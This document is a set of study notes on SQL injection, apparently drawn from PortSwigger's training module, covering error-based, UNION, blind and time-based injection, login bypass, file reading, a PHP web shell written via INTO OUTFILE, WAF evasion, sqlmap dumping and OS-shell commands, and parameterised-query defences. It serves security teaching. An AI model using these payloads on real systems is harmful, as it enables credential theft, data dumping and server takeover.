# 💉 Akshat's Notes — File 2
## SQL Injection — Complete Deep Dive

> Everything from PortSwigger SQL Injection module — in simple language.
> Real examples. Easy to remember. Day 5 of 60-Day Roadmap 🔥

---

# 🎯 What Is SQL Injection?

## The Simple Explanation

SQL Injection (SQLi) happens when a website **mixes user input with database queries** without checking the input first. An attacker types SQL code instead of normal text, and the database **executes it**.

**Real Life Example 🌍**
> Imagine a hotel receptionist checks your name against a guest list by calling out:
> *"Is [your name] on the list?"*
>
> Normal guest says: **"Akshat Sharma"**
> Receptionist calls: *"Is Akshat Sharma on the list?"* → Checks normally.
>
> Attacker says: **"anyone OR show me the entire list"**
> Receptionist calls: *"Is anyone OR show me the entire list on the list?"* → Shows EVERYONE.
>
> **The attacker manipulated the question itself, not just their answer.**

---

## Why SQL Injection Exists

Web applications store data in databases. To retrieve data, they build SQL queries using user input:

```php
// PHP code on the server (simplified)
$username = $_GET['username'];   // Gets what user typed in the URL

$query = "SELECT * FROM users WHERE username = '$username'";
// Database runs this query
```

If user types `akshat`, query becomes:
```sql
SELECT * FROM users WHERE username = 'akshat'
```
✅ Normal — finds user akshat.

If user types `akshat' OR '1'='1`:
```sql
SELECT * FROM users WHERE username = 'akshat' OR '1'='1'
```
⚠️ `'1'='1'` is ALWAYS true → Returns ALL users!

---

## Why SQLi Is So Dangerous

A successful SQL injection can let an attacker:

| Impact | What It Means |
|--------|--------------|
| **Read all data** | Usernames, passwords, emails, credit cards, medical records |
| **Bypass login** | Log in as admin without knowing the password |
| **Write data** | Change prices, balances, admin status |
| **Delete data** | `DROP TABLE users` — destroy entire database |
| **Read server files** | Read `/etc/passwd` from the database server |
| **Execute OS commands** | In some databases, run system commands |
| **Full server takeover** | Combine with file write to upload a shell |

> 🔴 **Real impact:** In 2017, Equifax breach exposed 147 million people's data. In 2012, LinkedIn lost 6.5 million password hashes. Many of these started with SQL injection.

---

# 📚 PART 1 — SQL BASICS (You Need This First)

## What Is SQL?

SQL (Structured Query Language) is the language used to talk to databases. Every website that stores data uses SQL (MySQL, PostgreSQL, SQLite, MSSQL, Oracle).

## Core SQL Commands

```sql
-- Get data
SELECT username, email FROM users;
SELECT * FROM users WHERE id = 1;
SELECT * FROM users WHERE username = 'akshat';

-- Filter results
SELECT * FROM users WHERE age > 18;
SELECT * FROM users WHERE username = 'akshat' AND password = 'pass123';
SELECT * FROM users WHERE username = 'akshat' OR username = 'admin';

-- Limit results
SELECT * FROM users LIMIT 10;
SELECT * FROM users ORDER BY username ASC;

-- Combine tables
SELECT users.username, orders.amount
FROM users
INNER JOIN orders ON users.id = orders.user_id;

-- Insert data
INSERT INTO users (username, email) VALUES ('akshat', 'a@a.com');

-- Update data
UPDATE users SET email = 'new@email.com' WHERE id = 1;

-- Delete data
DELETE FROM users WHERE id = 1;

-- Get database info (used in attacks!)
SELECT version();              -- Database version
SELECT database();             -- Current database name
SELECT user();                 -- Current database user
SELECT @@datadir;              -- Database file location
```

## Important SQL Concepts for SQLi

```sql
-- Comments (attacker uses these to cut off rest of query)
-- This is a comment in MySQL
# This is also a comment in MySQL
/* This is a multi-line comment */

-- String concatenation
SELECT 'Hello' || ' World';   -- PostgreSQL/SQLite
SELECT CONCAT('Hello', ' World'); -- MySQL

-- UNION (combine results of two queries — key for SQLi!)
SELECT username FROM users
UNION
SELECT email FROM customers;
-- Must have SAME NUMBER OF COLUMNS

-- Conditional expressions
SELECT IF(1=1, 'true', 'false');  -- MySQL
SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END;

-- Sleep/delay (used in blind SQLi)
SELECT SLEEP(5);              -- MySQL: pauses 5 seconds
SELECT pg_sleep(5);           -- PostgreSQL
WAITFOR DELAY '0:0:5';        -- MSSQL
```

---

# 🎯 PART 2 — TYPES OF SQL INJECTION

## Overview of All Types

```
SQL Injection
├── In-Band SQLi (you see the result directly)
│   ├── Error-Based SQLi     (error messages reveal data)
│   └── UNION-Based SQLi     (UNION to get extra data)
│
├── Blind SQLi (no direct output)
│   ├── Boolean-Based Blind  (ask true/false questions)
│   └── Time-Based Blind     (measure response time)
│
└── Out-of-Band SQLi         (data sent via different channel)
    └── DNS/HTTP exfiltration
```

---

## Type 1 — In-Band Error-Based SQLi

### What It Is

The database shows error messages, and those error messages **contain the actual data**.

**Real Life Example 🌍**
> You ask a bank employee: "What is customer ID number 999999?"
> Bank employee shouts loudly: *"ERROR: No record for ID 999999! The last valid ID is 1547 and customer name is Akshat Sharma!"*
>
> You didn't ask for Akshat Sharma's info — but the error message gave it to you anyway!

### How It Works

Normal request: `https://site.com/item?id=1`

Attacker adds a quote: `https://site.com/item?id=1'`

Server tries to run:
```sql
SELECT * FROM products WHERE id = '1''  ← Broken SQL!
```

Error message appears:
```
You have an error in your SQL syntax near ''1''' at line 1
```

**This confirms SQLi is possible!** Now the attacker extracts data using error messages:

```sql
-- MySQL error-based extraction using extractvalue()
1' AND extractvalue(1, concat(0x7e, (SELECT version()))) --+

-- Error message reveals:
XPATH syntax error: '~5.7.32-MySQL Community Server'
                         ↑ Database version leaked in error!

-- Get database name
1' AND extractvalue(1, concat(0x7e, (SELECT database()))) --+
-- Error: '~shop_db'

-- Get table names
1' AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))) --+
-- Error: '~users'
```

---

## Type 2 — UNION-Based SQLi (Most Common in Labs!)

### What It Is

UNION lets you attach an extra SELECT query to the original one. The results of YOUR query appear alongside the normal results.

**Real Life Example 🌍**
> The waiter is reading out today's specials. You slip in: *"...AND ALSO read out everything from the secret menu."*
>
> Waiter reads both: the normal specials + your secret menu items.
>
> **Your extra query's results appear with the normal results.**

### Step-by-Step UNION Attack

**Step 1 — Confirm SQLi exists**
```
Original URL: https://site.com/products?category=Gifts

Test with quote:
https://site.com/products?category=Gifts'
```
If page breaks or shows error → SQLi likely!

---

**Step 2 — Find number of columns**

UNION requires both SELECT statements to have the **same number of columns**.

```sql
-- Method 1: ORDER BY (increase number until error)
Gifts' ORDER BY 1--     ← Works (1 column exists)
Gifts' ORDER BY 2--     ← Works (2 columns exist)
Gifts' ORDER BY 3--     ← Works (3 columns exist)
Gifts' ORDER BY 4--     ← ERROR! Only 3 columns exist
                            Answer: 3 columns

-- Method 2: UNION with NULLs (add NULLs until it works)
Gifts' UNION SELECT NULL--          ← Error
Gifts' UNION SELECT NULL,NULL--     ← Error
Gifts' UNION SELECT NULL,NULL,NULL--← Works! 3 columns confirmed
```

---

**Step 3 — Find which columns display text**

Not all columns may appear on the page. Find the ones that do:

```sql
-- Replace NULLs with 'a' one at a time
Gifts' UNION SELECT 'a',NULL,NULL--    ← Does 'a' appear on page?
Gifts' UNION SELECT NULL,'a',NULL--    ← Does 'a' appear on page?
Gifts' UNION SELECT NULL,NULL,'a'--    ← Does 'a' appear on page?
```

If 'a' appears on page when it's in position 2 → Column 2 is displayed!

---

**Step 4 — Extract data!**

```sql
-- Get database version (replace NULL in visible column position)
Gifts' UNION SELECT NULL,version(),NULL--

-- Get database name
Gifts' UNION SELECT NULL,database(),NULL--

-- Get all table names
Gifts' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

-- Get columns in a specific table (users)
Gifts' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Get actual data!
Gifts' UNION SELECT NULL,username,password FROM users--

-- Multiple values in one column (if only 1 column shows)
Gifts' UNION SELECT NULL,concat(username,':',password),NULL FROM users--
```

**Result on page:**
```
Product Name        Price
─────────────       ─────
Gift Basket         ₹599
admin:5f4dcc3b      ₹0     ← Your injected result! (admin's MD5 hash)
akshat:abcdef12     ₹0
```

---

### The `information_schema` — The Database's Own Directory

`information_schema` is a special database that contains info about ALL other databases, tables, and columns. It's the attacker's best friend:

```sql
-- List all databases
SELECT schema_name FROM information_schema.schemata;

-- List all tables in current database
SELECT table_name FROM information_schema.tables
WHERE table_schema = database();

-- List all columns in a table
SELECT column_name, data_type FROM information_schema.columns
WHERE table_name = 'users';
```

**Real Life Example 🌍**
> `information_schema` is like a library catalogue. It doesn't contain the actual books (data), but it tells you exactly which books (tables) exist, which shelf (database) they're on, and their table of contents (columns).

---

## Type 3 — Boolean-Based Blind SQLi

### What It Is

The page gives NO error message and NO visible data. But the page **behaves differently** based on whether your injected condition is TRUE or FALSE.

**Real Life Example 🌍**
> You're in a room with someone who can only nod (Yes) or shake head (No). You ask yes/no questions to figure out their name:
> - "Is your name more than 5 letters?" → Nods ✅
> - "Does your name start with A?" → Nods ✅
> - "Does your name start with Ak?" → Nods ✅
> - "Is your name Akshat?" → Nods ✅
>
> You figured out the name by only seeing yes/no responses. **That's Boolean Blind SQLi.**

### How It Works

```
True condition  → Page loads normally (Welcome to our shop!)
False condition → Page shows something different (or is empty)
```

```sql
-- Test: Is the first character of the database name 's'?
https://site.com/item?id=1' AND SUBSTRING(database(),1,1)='s'--

True  → Page loads normally  → First char IS 's'
False → Page changes/empty   → First char is NOT 's'
```

**Extracting full database name character by character:**
```sql
AND SUBSTRING(database(),1,1)='s'  → True  → 1st char = s
AND SUBSTRING(database(),2,1)='h'  → True  → 2nd char = h
AND SUBSTRING(database(),3,1)='o'  → True  → 3rd char = o
AND SUBSTRING(database(),4,1)='p'  → True  → 4th char = p

Database name = "shop"!
```

**Practical example — extract password hash character by character:**
```sql
-- Is first char of admin password hash ASCII value > 50?
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>50--

-- Use binary search to narrow down:
> 50?  True
> 100? True
> 120? False → between 100-120
> 110? True  → between 110-120
> 115? False → between 110-115
> 112? True  → between 112-115
> 113? True  → between 113-115
> 114? False → answer is 113
ASCII 113 = 'q' → First char is 'q'
```

> 💡 **In real attacks**, tools like **sqlmap** automate this whole process. But knowing HOW it works manually is what interviews test!

---

## Type 4 — Time-Based Blind SQLi

### What It Is

No visible difference in page output at all. But the page **takes longer to respond** if your condition is true.

**Real Life Example 🌍**
> Same room, same person. But now they can't even nod or shake head. BUT — if your question is correct, they clap once (causing a 5-second delay). If wrong, they stay silent (instant response).
>
> Same technique — but now you measure **time** instead of visual difference.

### How It Works

```sql
-- MySQL: If condition is true, sleep 5 seconds
' AND IF(1=1, SLEEP(5), 0)--
→ Page takes 5+ seconds → Condition WAS true

' AND IF(1=2, SLEEP(5), 0)--
→ Page responds instantly → Condition WAS false
```

**Extracting database name:**
```sql
-- Is first char of database name 's'? (sleep 5 if yes)
' AND IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0)--
→ 5 second delay → YES, first char is 's'!

' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)--
→ Instant response → NO, not 'a'
```

**Database-specific time delay functions:**
```sql
MySQL:      SLEEP(5)
PostgreSQL: pg_sleep(5)
MSSQL:      WAITFOR DELAY '0:0:5'
Oracle:     dbms_pipe.receive_message('a',5)
```

---

# 🎯 PART 3 — AUTHENTICATION BYPASS

## Login Bypass — The Classic Attack

**Normal login query:**
```sql
SELECT * FROM users WHERE username='akshat' AND password='mypassword'
```
If it returns a row → user exists → log them in.

**Attacker types in username field:**
```
admin'--
```

Query becomes:
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything'
```

The `--` comments out everything after it! Query is now:
```sql
SELECT * FROM users WHERE username='admin'
-- AND password='anything'    ← This part is ignored!
```

Returns admin's row → Logged in as admin without knowing the password!

**Other bypass payloads:**
```sql
-- In username field:
admin'--
admin'#
admin'/*
' OR 1=1--
' OR '1'='1
' OR 1=1#
admin' OR '1'='1
' OR 'x'='x

-- If you don't know a username:
' OR 1=1 LIMIT 1--     ← Returns first user in table (usually admin!)

-- In password field (with known username):
admin' --              ← Comment out password check
anything' OR '1'='1    ← Make condition always true
```

**Real example walkthrough:**
```
Login form:
  Username: [         ]
  Password: [         ]

Attacker enters:
  Username: admin'--
  Password: anything

Server builds query:
  SELECT * FROM users WHERE username='admin'--' AND password='anything'

Database sees:
  SELECT * FROM users WHERE username='admin'
  (everything after -- is a comment)

Database finds admin user and returns it.
Server thinks: "Valid credentials! Log in!"

Result: Attacker is logged in as admin. 💀
```

---

# 🎯 PART 4 — ADVANCED SQLi TECHNIQUES

## Reading Files from the Server

Some databases can read files from the server filesystem!

```sql
-- MySQL: Read /etc/passwd (requires FILE privilege)
' UNION SELECT NULL, LOAD_FILE('/etc/passwd'), NULL--

-- If successful, you'll see:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

## Writing Files to the Server (Web Shell!)

```sql
-- MySQL: Write a PHP web shell to web root
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL
  INTO OUTFILE '/var/www/html/shell.php'--

-- Now access your shell:
https://site.com/shell.php?cmd=whoami
https://site.com/shell.php?cmd=cat /etc/passwd
https://site.com/shell.php?cmd=ls -la /var/www/html
```

> ⚠️ This is for authorised pentesting and labs only. This fully compromises the server.

## Second-Order SQLi (Stored SQLi)

**What it is:** The malicious input is stored safely but executed unsafely later.

```
Step 1: Register with username: admin'--
        Server sanitises input → stores it safely in DB: admin'--

Step 2: When you change your password, server builds:
        UPDATE users SET password='new' WHERE username='admin'--'
        The stored ' breaks the query NOW → SQLi executed!
```

**Real Life Example 🌍**
> A time bomb. The malicious payload is planted safely in step 1, but it only explodes (executes) when it's used in a different context later.

---

## SQLi in Different Contexts

SQLi doesn't only happen in URL parameters:

```sql
-- In HTTP headers (User-Agent, X-Forwarded-For, Referer)
User-Agent: Mozilla' OR 1=1--

-- In cookies
Cookie: user_id=1' OR 1=1--

-- In JSON body (API endpoints)
{"username": "admin'--", "password": "anything"}

-- In XML
<username>admin'--</username>

-- In search boxes
Search: %' OR 1=1--

-- In order/sort parameters
?sort=name' OR 1=1--
```

---

## Database Fingerprinting — Which Database Is It?

Different databases have different syntax. Knowing which one you're dealing with helps choose the right payloads.

```sql
-- MySQL specific
SELECT @@version;
SELECT VERSION();
SELECT SLEEP(1);
# Comment syntax

-- PostgreSQL specific
SELECT version();
SELECT pg_sleep(1);
-- Comment syntax
SELECT current_database();

-- MSSQL specific
SELECT @@version;
WAITFOR DELAY '0:0:1';
-- Comment syntax
SELECT DB_NAME();
SELECT name FROM sys.databases;

-- Oracle specific
SELECT * FROM v$version;
SELECT banner FROM v$version;
-- Comment syntax
SELECT 1 FROM dual;   ← Oracle requires FROM dual for simple selects
```

**Fingerprinting payloads (from PortSwigger):**
```sql
-- These only work in specific databases:
Oracle:     ' || (SELECT '' FROM dual) ||'
MySQL:      ' + (SELECT '' ) +'
MSSQL:      ' + (SELECT '' ) +'
PostgreSQL: ' || (SELECT '') ||'
```

---

## Bypassing WAF (Web Application Firewall)

WAFs block common SQLi patterns. Attackers use evasion techniques:

```sql
-- Normal (blocked by WAF):
' UNION SELECT username,password FROM users--

-- Case variation:
' uNiOn SeLeCt username,password fRoM users--

-- Comments to break keywords:
' UN/**/ION SEL/**/ECT username,password FR/**/OM users--

-- URL encoding:
%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--

-- Double URL encoding:
%2527 instead of '

-- Using equivalent functions:
SUBSTRING() → MID(), SUBSTR()
ASCII()      → ORD()
IF()         → CASE WHEN

-- Whitespace alternatives:
UNION SELECT → UNION%09SELECT (tab)
              UNION%0ASELECT  (newline)
              UNION%0DSELECT  (carriage return)
```

---

# 🔧 PART 5 — SQLMAP (The Automation Tool)

## What Is sqlmap?

sqlmap is an open-source tool that automatically detects and exploits SQL injection. It does in seconds what takes hours manually.

```bash
# Basic usage
sqlmap -u "https://site.com/item?id=1"

# Test specific parameter
sqlmap -u "https://site.com/item?id=1" -p id

# With cookies (for authenticated pages)
sqlmap -u "https://site.com/profile?id=1" --cookie="session=abc123"

# GET all databases
sqlmap -u "https://site.com/item?id=1" --dbs

# Get tables in a database
sqlmap -u "https://site.com/item?id=1" -D shopdb --tables

# Get columns in a table
sqlmap -u "https://site.com/item?id=1" -D shopdb -T users --columns

# Dump all data from table
sqlmap -u "https://site.com/item?id=1" -D shopdb -T users --dump

# Dump everything (all databases!)
sqlmap -u "https://site.com/item?id=1" --dump-all

# POST request
sqlmap -u "https://site.com/login" --data="username=admin&password=test"

# From Burp Suite request file
sqlmap -r request.txt

# Try to get OS shell
sqlmap -u "https://site.com/item?id=1" --os-shell

# Try to read a file
sqlmap -u "https://site.com/item?id=1" --file-read="/etc/passwd"

# Increase aggressiveness (risk/level)
sqlmap -u "https://site.com/item?id=1" --level=5 --risk=3

# Use specific technique
sqlmap -u "https://site.com/item?id=1" --technique=U  # UNION only
sqlmap -u "https://site.com/item?id=1" --technique=B  # Boolean blind only
sqlmap -u "https://site.com/item?id=1" --technique=T  # Time blind only
```

> 💡 **Practice:** Set up DVWA (Damn Vulnerable Web Application) locally or use PortSwigger's Web Academy labs. Never run sqlmap against sites without permission!

---

# 🛡️ PART 6 — PREVENTION (What Developers Should Do)

## Parameterised Queries — The Fix

**Wrong (vulnerable):**
```php
// PHP - DANGEROUS
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = $id";
$result = $db->query($query);
```

**Right (safe):**
```php
// PHP - SAFE (Parameterised Query / Prepared Statement)
$id = $_GET['id'];
$stmt = $db->prepare("SELECT * FROM products WHERE id = ?");
$stmt->bind_param("i", $id);  // "i" = integer type
$stmt->execute();
$result = $stmt->get_result();
```

**How it works:**
```
With parameterised queries:
  Query template: SELECT * FROM products WHERE id = ?
  Parameter:      1; DROP TABLE products--

  Database treats the ENTIRE parameter as a VALUE, not code.
  It looks for a product with id = "1; DROP TABLE products--"
  (literally that entire string as the ID — which doesn't exist)
  
  The SQL code is NEVER executed. Attack fails.
```

**In Python:**
```python
# Wrong
query = f"SELECT * FROM users WHERE username = '{username}'"

# Right
query = "SELECT * FROM users WHERE username = %s"
cursor.execute(query, (username,))
```

## Other Defences

```
1. Parameterised queries / Prepared statements    ← MOST IMPORTANT
2. Stored procedures (when done correctly)
3. Input validation (whitelist allowed characters)
4. Least privilege (database user only has SELECT, not DROP)
5. WAF (Web Application Firewall) — last resort, not reliable alone
6. Error handling (never show raw SQL errors to users)
7. Regular security testing (find bugs before attackers do)
```

---

# ❓ PART 7 — INTERVIEW QUESTIONS

---

**Q1: What is SQL injection and why does it happen?**

> "SQL injection happens when user input is included directly in database queries without proper sanitisation or parameterisation. An attacker can include SQL code as input which the database then executes. It exists because developers concatenate user input into SQL strings instead of using prepared statements. The fix is parameterised queries — where the query structure is defined first, and user input is passed as a separate parameter that's always treated as data, never as code."

---

**Q2: What is the difference between in-band and blind SQL injection?**

> "In-band SQLi means you can see the results directly in the web page response — either through error messages (error-based) or by using UNION to append your query results to the legitimate results. Blind SQLi means there's no visible output. You infer information either by observing whether the page changes based on true/false conditions (boolean-based) or by measuring response time when the database is made to sleep (time-based). Blind is harder and slower but still fully exploitable."

---

**Q3: How would you find SQL injection manually?**

> "I start by testing inputs with a single quote ' to see if the page breaks or throws an error — that's often the first sign. Then I test with `' OR '1'='1` to see if I get more results than expected. For UNION-based, I'd use ORDER BY incrementing numbers to find the column count, then NULL payloads to confirm, then replace NULLs with actual data extraction queries against information_schema to map the database structure before dumping sensitive tables."

---

**Q4: What is the information_schema and why is it important?**

> "information_schema is a meta-database that exists in most SQL databases (MySQL, PostgreSQL, MSSQL). It contains metadata about every other database, table, and column on the server. During SQL injection, after confirming the vulnerability and column count, I query information_schema.tables to list all tables, then information_schema.columns to get the structure of interesting tables like 'users', then finally query those tables for actual data. It's essentially the database's own directory."

---

**Q5: What is a parameterised query and how does it prevent SQLi?**

> "A parameterised query separates the SQL code structure from the data values. The query template is sent to the database first with placeholders (? or %s). Then the user input is sent separately as typed parameters. The database compiles the query structure first, so when the data arrives, it's treated purely as a value — never as executable code. Even if the input contains SQL syntax like `'; DROP TABLE users--`, it's just searched for literally as a string, not executed."

---

# 📌 CHEAT SHEET — Stick This on Your Wall

```
╔══════════════════════════════════════════════════════════╗
║            SQL INJECTION QUICK REFERENCE                 ║
╠══════════════════════════════════════════════════════════╣
║  DETECTION:                                              ║
║  ' → Error or broken page = possible SQLi               ║
║  '' → Should work (escaped quote)                       ║
║  ' OR '1'='1 → More results = SQLi confirmed!           ║
╠══════════════════════════════════════════════════════════╣
║  UNION ATTACK STEPS:                                     ║
║  1. Find columns: ORDER BY 1,2,3... until error         ║
║  2. Confirm: UNION SELECT NULL,NULL,NULL--               ║
║  3. Find visible: replace NULLs with 'a' one at a time  ║
║  4. Extract: version(), database(), tables, columns      ║
╠══════════════════════════════════════════════════════════╣
║  COMMENT SYNTAX:                                         ║
║  MySQL:  -- (space after) or #                          ║
║  MSSQL:  --                                             ║
║  Oracle: --                                             ║
║  All:    /* comment */                                   ║
╠══════════════════════════════════════════════════════════╣
║  KEY QUERIES:                                            ║
║  DB version:  SELECT version()  / SELECT @@version      ║
║  DB name:     SELECT database()                         ║
║  Tables:      SELECT table_name FROM                    ║
║               information_schema.tables                 ║
║  Columns:     SELECT column_name FROM                   ║
║               information_schema.columns                ║
║               WHERE table_name='users'                  ║
╠══════════════════════════════════════════════════════════╣
║  BLIND SQLi:                                             ║
║  Boolean: ' AND 1=1-- (true) vs ' AND 1=2-- (false)    ║
║  Time:    ' AND SLEEP(5)-- (MySQL)                      ║
╠══════════════════════════════════════════════════════════╣
║  LOGIN BYPASS:  admin'--  or  ' OR 1=1--               ║
║  FIX:           Parameterised queries / Prepared stmts  ║
╚══════════════════════════════════════════════════════════╝
```

---
